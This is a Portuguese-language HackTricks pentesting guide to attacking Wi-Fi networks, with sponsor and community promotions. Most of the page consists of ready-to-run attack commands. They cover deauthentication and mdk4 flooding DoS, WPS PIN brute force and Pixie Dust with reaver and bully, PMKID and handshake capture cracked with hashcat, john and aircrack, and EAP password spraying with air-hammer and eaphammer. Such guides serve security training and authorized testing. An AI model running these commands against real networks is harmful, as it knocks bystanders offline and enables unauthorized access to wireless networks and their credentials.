# Pentesting Wifi

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo do [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Interaja com conte√∫dos que exploram a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais novos bug bounties lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje mesmo!

## Comandos b√°sicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Ferramentas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Execute o airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Pode realizar ataques Evil Twin, KARMA e Known Beacons e, em seguida, usar um template de phishing para conseguir obter a senha real da rede ou capturar credenciais de redes sociais.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta ferramenta automatiza ataques **WPS/WEP/WPA-PSK**. Ela automaticamente:

* Configura a interface em modo monitor
* Escaneia por redes poss√≠veis - E permite que voc√™ selecione a(s) v√≠tima(s)
* Se WEP - Inicia ataques WEP
* Se WPA-PSK
* Se WPS: Ataque Pixie dust e o ataque de for√ßa bruta (cuidado, o ataque de for√ßa bruta pode demorar muito). Note que n√£o tenta PIN nulo ou PINs de banco de dados/gerados.
* Tenta capturar o PMKID do AP para quebr√°-lo
* Tenta desautenticar clientes do AP para capturar um handshake
* Se PMKID ou Handshake, tenta for√ßa bruta usando as 5000 senhas mais comuns.

## Resumo dos Ataques

* **DoS**
* Desautentica√ß√£o/desassocia√ß√£o -- Desconecta todos (ou um ESSID/Cliente espec√≠fico)
* APs falsos aleat√≥rios -- Esconde redes, poss√≠vel travamento de scanners
* Sobrecarga no AP -- Tenta derrubar o AP (geralmente n√£o muito √∫til)
* WIDS -- Interage com o IDS
* TKIP, EAPOL -- Alguns ataques espec√≠ficos para DoS em alguns APs
* **Cracking**
* Quebrar **WEP** (v√°rias ferramentas e m√©todos)
* **WPA-PSK**
* **WPS** pin "For√ßa Bruta"
* **WPA PMKID** for√ßa bruta
* \[DoS +] **WPA handshake** captura + Cracking
* **WPA-MGT**
* **Captura de nome de usu√°rio**
* **For√ßa Bruta** Credenciais
* **Evil Twin** (com ou sem DoS)
* **Open** Evil Twin \[+ DoS] -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques na LAN
* **WPA-PSK** Evil Twin -- √ötil para ataques na rede se voc√™ conhece a senha
* **WPA-MGT** -- √ötil para capturar credenciais empresariais
* **KARMA, MANA**, **Loud MANA**, **Known beacon**
* **+ Open** -- √ötil para capturar credenciais de portal cativo e/ou realizar ataques na LAN
* **+ WPA** -- √ötil para capturar handshakes WPA

## DOS

### Pacotes de Desautentica√ß√£o

A maneira mais comum de realizar esse tipo de ataque √© com pacotes de **desautentica√ß√£o**. Estes s√£o um tipo de quadro de "gerenciamento" respons√°vel por desconectar um dispositivo de um ponto de acesso. Forjar esses pacotes √© a chave para [hackear muitas redes Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), pois voc√™ pode for√ßar a desconex√£o de qualquer cliente da rede a qualquer momento. A facilidade com que isso pode ser feito √© um tanto assustadora e √© frequentemente feita como parte da coleta de um handshake WPA para quebrar.

Al√©m de momentaneamente usar essa desconex√£o para colher um handshake para quebrar, voc√™ tamb√©m pode simplesmente deixar esses desauts continuarem, o que tem o efeito de bombardear o cliente com pacotes de desautentica√ß√£o aparentemente vindos da rede √† qual est√£o conectados. Como esses quadros n√£o s√£o criptografados, muitos programas tiram vantagem dos quadros de gerenciamento forjando-os e enviando-os para um ou todos os dispositivos em uma rede.\
**Descri√ß√£o de** [**aqui**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Desautentica√ß√£o usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa desautentica√ß√£o
* 1 √© o n√∫mero de desautentica√ß√µes a enviar (voc√™ pode enviar v√°rias se desejar); 0 significa envi√°-las continuamente
* \-a 00:14:6C:7E:40:80 √© o endere√ßo MAC do ponto de acesso
* \-c 00:0F:B5:34:30:30 √© o endere√ßo MAC do cliente a desautenticar; se isso for omitido, ent√£o a desautentica√ß√£o broadcast √© enviada (nem sempre funciona)
* ath0 √© o nome da interface

### Pacotes de Desassocia√ß√£o

Pacotes de desassocia√ß√£o s√£o outro tipo de quadro de gerenciamento que √© usado para desconectar um n√≥ (significando qualquer dispositivo como um laptop ou celular) de um ponto de acesso pr√≥ximo. A diferen√ßa entre quadros de desautentica√ß√£o e desassocia√ß√£o √© principalmente a maneira como s√£o usados.

Um AP que deseja desconectar um dispositivo n√£o autorizado enviaria um pacote de desautentica√ß√£o para informar o dispositivo que ele foi desconectado da rede, enquanto um pacote de desassocia√ß√£o √© usado para desconectar quaisquer n√≥s quando o AP est√° desligando, reiniciando ou deixando a √°rea.

**Descri√ß√£o retirada** [**daqui**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Este ataque pode ser realizado pelo mdk4(modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques DOS por mdk4**

**De** [**aqui**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inunda√ß√£o de Beacons**

Envia quadros beacon para exibir APs falsos nos clientes. Isso pode, √†s vezes, travar scanners de rede e at√© drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Nega√ß√£o de Servi√ßo de Autentica√ß√£o**

Envia quadros de autentica√ß√£o para todos os APs encontrados no alcance. Um n√∫mero excessivo de clientes pode congelar ou reiniciar v√°rios APs.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondagem de SSID e Bruteforce**

Sonda APs e verifica por respostas, √∫til para checar se o SSID foi corretamente desmascarado e se o AP est√° dentro do seu alcance de envio. **Bruteforce de SSIDs ocultos** com ou sem uma wordlist tamb√©m est√° dispon√≠vel.

**MODO DE ATAQUE m: Explora√ß√£o de Contramedidas Michael**

Envia pacotes aleat√≥rios ou reinjeta duplicatas em outra fila QoS para provocar Contramedidas Michael em **APs TKIP**. O AP ent√£o ser√° desligado por um minuto inteiro, tornando isso um **DoS** efetivo.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inje√ß√£o de Pacotes EAPOL Start e Logoff**

Inunda um AP com quadros **EAPOL** Start para mant√™-lo ocupado com **sess√µes falsas** e, assim, impede que ele lide com clientes leg√≠timos. Ou desconecta clientes **injetando falsas mensagens** de Logoff **EAPOL**.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes mesh IEEE 802.11s**

V√°rios ataques ao gerenciamento de links e roteamento em redes mesh. Inunde vizinhos e rotas, crie buracos negros e desvie o tr√°fego!

**MODO DE ATAQUE w: Confus√£o WIDS**

Confunda/Abuse de Sistemas de Detec√ß√£o e Preven√ß√£o de Intrus√µes conectando clientes a m√∫ltiplos n√≥s WDS ou APs falsos e maliciosos.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Packet Fuzzer**

Um packet fuzzer simples com m√∫ltiplas fontes de pacotes e um bom conjunto de modificadores. Tenha cuidado!

### **Airgeddon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos coment√°rios anteriores:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS significa Wi-Fi Protected Setup. √â um padr√£o de seguran√ßa de rede sem fio que tenta tornar as conex√µes entre um roteador e dispositivos sem fio mais r√°pidas e f√°ceis. **WPS funciona apenas para redes sem fio que usam uma senha** criptografada com os protocolos de seguran√ßa **WPA** Personal ou **WPA2** Personal. WPS n√£o funciona em redes sem fio que est√£o usando a seguran√ßa WEP obsoleta, que pode ser facilmente quebrada por qualquer hacker com um conjunto b√°sico de ferramentas e habilidades. (De [aqui](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

WPS usa um PIN de 8 d√≠gitos para permitir que um usu√°rio se conecte √† rede, mas primeiro √© verificado os primeiros 4 n√∫meros e, se corretos, ent√£o √© verificado os segundos 4 n√∫meros. Assim, √© poss√≠vel fazer Brute-Force na primeira metade e depois na segunda metade (apenas 11000 possibilidades).

### WPS Bruteforce

Existem 2 ferramentas principais para realizar essa a√ß√£o: Reaver e Bully.

* **Reaver** foi projetado para ser um ataque robusto e pr√°tico contra WPS, e foi testado contra uma grande variedade de pontos de acesso e implementa√ß√µes de WPS.
* **Bully** √© uma **nova implementa√ß√£o** do ataque de brute force WPS, escrita em C. Tem v√°rias vantagens sobre o c√≥digo original do reaver: menos depend√™ncias, melhor desempenho de mem√≥ria e CPU, tratamento correto de endianness e um conjunto mais robusto de op√ß√µes.

Este ataque tira proveito de uma **fraqueza no c√≥digo PIN WPS de oito d√≠gitos**; por causa desse problema, o protocolo **divulga informa√ß√µes sobre os primeiros quatro d√≠gitos do PIN**, e o **√∫ltimo** d√≠gito funciona como um **checksum**, o que facilita o brute force no AP WPS.\
Note que alguns dispositivos incluem **prote√ß√µes contra brute-force**, que geralmente **bloqueiam endere√ßos MAC** que tentam atacar repetidamente. Nesse caso, a complexidade deste ataque aumenta, pois voc√™ teria que **rotacionar endere√ßos MAC** enquanto testa os PINs.

Se o c√≥digo WPS v√°lido for encontrado, tanto Bully quanto Reaver o usar√£o para descobrir o PSK WPA/WPA2 usado para proteger a rede, ent√£o voc√™ poder√° se conectar sempre que precisar.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute force**

Em vez de come√ßar tentando todos os PINs poss√≠veis, voc√™ deve verificar se h√° **PINs descobertos para o AP que voc√™ est√° atacando** (dependendo do MAC do fabricante) e os **PINs gerados pelo software PIN**.

* O banco de dados de PINs conhecidos √© feito para Access Points de certos fabricantes para os quais √© sabido que eles usam os mesmos WPS PINs. Este banco de dados cont√©m os tr√™s primeiros octetos de endere√ßos MAC e uma lista de PINs correspondentes que s√£o muito prov√°veis para esse fabricante.
* Existem v√°rios algoritmos para gerar WPS PINs. Por exemplo, ComputePIN e EasyBox usam o endere√ßo MAC do Access Point em seus c√°lculos. Mas o algoritmo Arcadyan tamb√©m requer um ID do dispositivo.

### Ataque WPS Pixie Dust

Dominique Bongard descobriu que alguns APs t√™m formas fracas de gerar **nonces** (conhecidos como **E-S1** e **E-S2**) que deveriam ser secretos. Se conseguirmos descobrir quais s√£o esses nonces, podemos facilmente encontrar o WPS PIN de um AP, j√° que o AP deve nos fornecer em um hash para provar que tamb√©m conhece o PIN, e o cliente n√£o est√° se conectando a um AP falso. Esses E-S1 e E-S2 s√£o essencialmente as "chaves para destrancar a caixa" contendo o WPS pin. Mais informa√ß√µes aqui: [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

Basicamente, algumas implementa√ß√µes falharam no uso de chaves aleat√≥rias para criptografar as 2 partes do PIN (j√° que ele √© decomposto em 2 partes durante a comunica√ß√£o de autentica√ß√£o e enviado ao cliente), ent√£o um ataque offline poderia ser usado para for√ßar bruscamente o PIN v√°lido.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Ataque Null Pin

Algumas implementa√ß√µes muito ruins permitiam a conex√£o com o PIN Nulo (tamb√©m muito estranho). O Reaver pode testar isso (o Bully n√£o pode).
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente realizados usando _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 e 6 permitem que voc√™ tente **seu PIN personalizado** (se voc√™ tiver algum)
* 7 e 8 realizam o **ataque Pixie Dust**
* 13 permite que voc√™ teste o **PIN NULL**
* 11 e 12 ir√£o **recolher os PINs relacionados ao AP selecionado de bancos de dados dispon√≠veis** e **gerar** poss√≠veis **PINs** usando: ComputePIN, EasyBox e opcionalmente Arcadyan (recomendado, por que n√£o?)
* 9 e 10 testar√£o **todos os PINs poss√≠veis**

## **WEP**

T√£o quebrado e desaparecido que n√£o vou falar sobre isso. Apenas saiba que _**airgeddon**_ tem uma op√ß√£o WEP chamada "All-in-One" para atacar esse tipo de prote√ß√£o. Mais ferramentas oferecem op√ß√µes semelhantes.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Insights de Hacking**\
Interaja com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado com os mais novos programas de recompensa por bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os principais hackers hoje!

## WPA/WPA2 PSK

### PMKID

Em 2018, os autores do hashcat [divulgaram](https://hashcat.net/forum/thread-7717.html) um novo tipo de ataque que n√£o depende apenas **de um √∫nico pacote**, mas tamb√©m n√£o requer que clientes estejam conectados ao nosso AP alvo, apenas a comunica√ß√£o entre o atacante e o AP.

Acontece que **muitos** roteadores modernos anexam um **campo opcional** no final do **primeiro quadro EAPOL** enviado pelo pr√≥prio AP quando algu√©m est√° se associando, o chamado `Robust Security Network`, que inclui algo chamado `PMKID`

Como explicado no post original, o **PMKID** √© derivado usando dados que s√£o conhecidos por n√≥s:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**Uma vez que a string "PMK Name" √© constante, sabemos tanto o BSSID do AP quanto da esta√ß√£o e o `PMK` √© o mesmo obtido de um handshake completo de 4 vias**, isso √© tudo que o hashcat precisa para decifrar o PSK e recuperar a senha!
Descri√ß√£o obtida [aqui](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Para **coletar** essas informa√ß√µes e **for√ßar bruscamente** localmente a senha, voc√™ pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs capturados** ser√£o exibidos no **console** e tamb√©m **salvos** dentro de \_**/tmp/attack.pcap**\_

Agora, converta a captura para o formato **hashcat/john** e quebre-a:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Observe que o formato de um hash correto cont√©m **4 partes**, como: _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Se o seu cont√©m **apenas** **3 partes**, ent√£o, ele √© **inv√°lido** (a captura do PMKID n√£o foi v√°lida).

Note que `hcxdumptool` **tamb√©m captura handshakes** (algo assim aparecer√°: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Voc√™ pode **transformar** os **handshakes** para o formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Percebi que alguns handshakes capturados com esta ferramenta n√£o puderam ser decifrados mesmo sabendo a senha correta. Eu recomendaria capturar handshakes tamb√©m pelo m√©todo tradicional se poss√≠vel, ou capturar v√°rios deles usando esta ferramenta._

### Captura de Handshake

Uma maneira de atacar redes **WPA/WPA2** √© capturar um **handshake** e tentar **decifrar** a senha usada **offline**. Para fazer isso, voc√™ precisa encontrar o **BSSID** e o **canal** da rede **v√≠tima**, e um **cliente** que esteja conectado √† rede.\
Uma vez que voc√™ tenha essas informa√ß√µes, voc√™ deve come√ßar a **escutar** toda a comunica√ß√£o desse **BSSID** naquele **canal**, porque, com sorte, o handshake ser√° enviado l√°:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Agora voc√™ precisa **desautenticar** o **cliente** por alguns segundos para que ele se autentique automaticamente novamente ao AP (por favor, leia a parte de DoS para encontrar v√°rias maneiras de desautenticar um cliente):
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Note que, como o cliente foi desautenticado, ele pode tentar se conectar a um AP diferente ou, em outros casos, a uma rede diferente._

Uma vez que no `airodump-ng` aparecer alguma informa√ß√£o de handshake, isso significa que o handshake foi capturado e voc√™ pode parar de escutar:

![](<../../.gitbook/assets/image (172) (1).png>)

Uma vez que o handshake √© capturado, voc√™ pode **crackear** com `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se o handshake est√° no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do completo, ela n√£o detectar√° o v√°lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**√â** importante falar sobre os **diferentes m√©todos de autentica√ß√£o** que podem ser usados por uma Wifi empresarial. Para este tipo de Wifis, voc√™ provavelmente encontrar√° em `airodump-ng` algo assim:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP** (Protocolo de Autentica√ß√£o Extens√≠vel) √© a **estrutura** da **comunica√ß√£o de autentica√ß√£o**, em cima disso, um **algoritmo de autentica√ß√£o** √© usado pelo servidor para autenticar o **cliente** (**supplicant**) e em alguns casos pelo cliente para autenticar o servidor.
Principais algoritmos de autentica√ß√£o usados neste caso:

* **EAP-GTC:** √â um m√©todo EAP para suportar o uso de tokens de hardware e senhas de uso √∫nico com EAP-PEAP. Sua implementa√ß√£o √© semelhante ao MSCHAPv2, mas n√£o usa um desafio entre pares. Em vez disso, as senhas s√£o enviadas ao ponto de acesso em **texto puro** (muito interessante para ataques de downgrade).
* **EAP-MD-5 (Message Digest)**: O cliente envia o hash MD5 da senha. **N√£o recomendado**: Vulner√°vel a ataques de dicion√°rio, sem autentica√ß√£o do servidor e sem forma de gerar chaves de privacidade equivalentes a fio (WEP) por sess√£o.
* **EAP-TLS (Transport Layer Security)**: Baseia-se em **certificados do lado do cliente e do servidor** para realizar a autentica√ß√£o e pode ser usado para gerar dinamicamente chaves WEP baseadas no usu√°rio e na sess√£o para proteger comunica√ß√µes subsequentes.
* **EAP-TTLS (Tunneled Transport Layer Security)**: **Autentica√ß√£o m√∫tua** do cliente e da rede atrav√©s de um canal criptografado (ou t√∫nel), bem como um meio para derivar chaves WEP din√¢micas, por usu√°rio e por sess√£o. Ao contr√°rio do EAP-TLS, **o EAP-TTLS requer apenas certificados do lado do servidor (o cliente usar√° credenciais)**.
* **PEAP (Protocolo de Autentica√ß√£o Extens√≠vel Protegido)**: PEAP √© como o protocolo **EAP** mas criando um **t√∫nel TLS** para proteger a comunica√ß√£o. Ent√£o, protocolos de autentica√ß√£o fracos podem ser usados em cima do EAP, pois ser√£o protegidos pelo t√∫nel.
* **PEAP-MSCHAPv2**: Isso tamb√©m √© conhecido apenas como **PEAP** porque √© amplamente adotado. Isso √© apenas o desafio/resposta vulner√°vel chamado MSCHAPv2 em cima do PEAP (√© protegido pelo t√∫nel TLS).
* **PEAP-EAP-TLS ou apenas PEAP-TLS**: √â muito semelhante ao **EAP-TLS** mas um t√∫nel TLS √© criado antes da troca de certificados.

Voc√™ pode encontrar mais informa√ß√µes sobre esses m√©todos de autentica√ß√£o [aqui](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol) e [aqui](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nome de Usu√°rio

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que se voc√™ est√° usando **EAP**, as **mensagens "Identity"** devem ser **suportadas**, e o **nome de usu√°rio** ser√° enviado em **claro** nas mensagens **"Response Identity"**.

Mesmo usando um dos m√©todos de autentica√ß√£o mais seguros: **PEAP-EAP-TLS**, √© poss√≠vel **capturar o nome de usu√°rio enviado no protocolo EAP**. Para fazer isso, **capture uma comunica√ß√£o de autentica√ß√£o** (inicie `airodump-ng` dentro de um canal e `wireshark` na mesma interface) e filtre os pacotes por `eapol`.\
Dentro do pacote "**Response, Identity**", o **nome de usu√°rio** do cliente aparecer√°.

![](<../../.gitbook/assets/image (150).png>)

### Identidades An√¥nimas

(Informa√ß√µes retiradas de [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm))

Tanto **EAP-PEAP quanto EAP-TTLS suportam oculta√ß√£o de identidade**. Em um ambiente WiFi, o ponto de acesso (AP) geralmente gera uma solicita√ß√£o de Identidade EAP como parte do processo de associa√ß√£o. Para preservar o anonimato, o cliente EAP no sistema do usu√°rio pode responder apenas com informa√ß√µes suficientes para permitir que o primeiro servidor RADIUS processe a solicita√ß√£o, conforme mostrado nos seguintes exemplos.

* _**EAP-Identity = anonymous**_

> Neste exemplo, todos os usu√°rios compartilhar√£o o pseudo-nome de usu√°rio ‚Äúanonymous‚Äù. O primeiro servidor RADIUS √© um servidor EAP-PEAP ou EAP-TTLS que conduz o lado do servidor do protocolo PEAP ou TTLS. O tipo de autentica√ß√£o interna (protegida) ser√° ent√£o tratado localmente ou encaminhado para um servidor RADIUS remoto (de origem).

* _**EAP-Identity = anonymous@realm_x**_

> Neste exemplo, usu√°rios pertencentes a diferentes reinos ocultam sua pr√≥pria identidade, mas indicam a qual reino pertencem para que o primeiro servidor RADIUS possa encaminhar as solicita√ß√µes EAP-PEAP ou EAP-TTLS para servidores RADIUS em seus reinos de origem, que atuar√£o como o servidor PEAP ou TTLS. O primeiro servidor atua puramente como um n√≥ de retransmiss√£o RADIUS.
>
> Alternativamente, o primeiro servidor pode atuar como o servidor EAP-PEAP ou EAP-TTLS e processar o m√©todo de autentica√ß√£o protegido ou encaminh√°-lo para outro servidor. Esta op√ß√£o pode ser usada para configurar diferentes pol√≠ticas para diferentes reinos.

No EAP-PEAP, uma vez que o servidor PEAP e o cliente PEAP estabelecem o t√∫nel TLS, o servidor PEAP gera uma solicita√ß√£o de Identidade EAP e a transmite pelo t√∫nel TLS. O cliente responde a esta segunda solicita√ß√£o de Identidade EAP enviando uma resposta de Identidade EAP contendo a verdadeira identidade do usu√°rio pelo t√∫nel criptografado. Isso impede que qualquer pessoa que esteja interceptando o tr√°fego 802.11 descubra a verdadeira identidade do usu√°rio.

O EAP-TTLS funciona de maneira um pouco diferente. Com o EAP-TTLS, o cliente normalmente se autentica via PAP ou CHAP protegido pelo t√∫nel TLS. Neste caso, o cliente incluir√° um atributo User-Name e um atributo Password ou CHAP-Password na primeira mensagem TLS enviada ap√≥s o estabelecimento do t√∫nel.

Com qualquer um dos protocolos, o servidor PEAP/TTLS aprende a verdadeira identidade do usu√°rio uma vez que o t√∫nel TLS tenha sido estabelecido. A verdadeira identidade pode ser na forma _**user@realm**_ ou simplesmente _**user**_. Se o servidor PEAP/TTLS tamb√©m estiver autenticando o _**usu√°rio**_, ele agora conhece a identidade do usu√°rio e prossegue com o m√©todo de autentica√ß√£o sendo protegido pelo t√∫nel TLS. Alternativamente, o servidor PEAP/TTLS pode encaminhar uma nova solicita√ß√£o RADIUS para o servidor RADIUS de origem do usu√°rio. Esta nova solicita√ß√£o RADIUS tem o protocolo PEAP ou TTLS removido. Se o m√©todo de autentica√ß√£o protegido for EAP, as mensagens EAP internas s√£o transmitidas para o servidor RADIUS de origem sem o inv√≥lucro EAP-PEAP ou EAP-TTLS. O atributo User-Name da mensagem RADIUS de sa√≠da cont√©m a verdadeira identidade do usu√°rio ‚Äì n√£o a identidade an√¥nima do atributo User-Name da solicita√ß√£o RADIUS de entrada. Se o m√©todo de autentica√ß√£o protegido for PAP ou CHAP (suportado apenas pelo TTLS), o User-Name e outros atributos de autentica√ß√£o recuperados do payload TLS s√£o colocados na mensagem RADIUS de sa√≠da no lugar do User-Name an√¥nimo e dos atributos TTLS EAP-Message inclu√≠dos na solicita√ß√£o RADIUS de entrada.

### EAP-Bruteforce (password spray)

Se espera-se que o cliente use um **nome de usu√°rio e senha** (note que **EAP-TLS n√£o ser√° v√°lido** neste caso), ent√£o voc√™ poderia tentar obter uma **lista** de **nomes de usu√°rio** (veja a pr√≥xima parte) e **senhas** e tentar **for√ßar a entrada** no acesso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Voc√™ tamb√©m pode realizar este ataque usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
